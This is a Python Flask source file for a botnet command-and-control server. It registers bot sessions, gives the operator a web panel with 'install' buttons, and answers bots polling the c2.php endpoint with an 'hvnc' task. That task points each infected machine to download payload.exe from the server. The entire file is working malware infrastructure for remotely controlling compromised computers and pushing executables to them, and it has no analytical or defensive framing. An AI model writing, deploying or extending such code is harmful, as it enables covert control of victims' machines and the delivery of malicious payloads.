from flask import Flask
from flask import request, send_from_directory

import random

installed_bots = []
installing_bots = []
sessions = []
app = Flask("Bot")

@app.route('/')
def main():
	html = ""
	for i in range(len(sessions)):
		html += f'''
				<h1>Bot {sessions[i]}</h1>
				<h3>status: {"installed" if sessions[i] in installed_bots else "not installed"}</h3>
				<button onclick='fetch("/install?botid={sessions[i]}")'>install</button>
				'''
	return html if len(html) else "no bots"

@app.route('/install')
def install():
	botid = request.args["botid"]
	if (botid not in installing_bots):
		installing_bots.append(botid)
	return '{"status": "ok"}'

@app.route('/payload.exe')
def payload():
	return send_from_directory("./src", "payload.exe")

@app.route('/c2.php')
def c2():
	action = request.args["action"]
	
	if (action == "installnewbot"):
		new_session = random.randint(0, 9999)
		return str(new_session)
	
	botid = request.args["botid"]
		
	if (action == "fetchcommand"):
		if (botid not in sessions):
			sessions.append(botid)

		if (botid in installing_bots):
			installing_bots.remove(botid)
			installed_bots.append(botid)
			return '{"task_name": "hvnc", "task_command": "' + request.host_url + 'payload.exe", "task_status": "enabled"}'
		
		return '{"task_name": "hvnc", "task_command": "' + request.host_url + 'payload.exe", "task_status": "disabled"}'
	
	return '{"task_name": "new_task", "task_commnad": "idle", "task_status": "idle"}'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=80)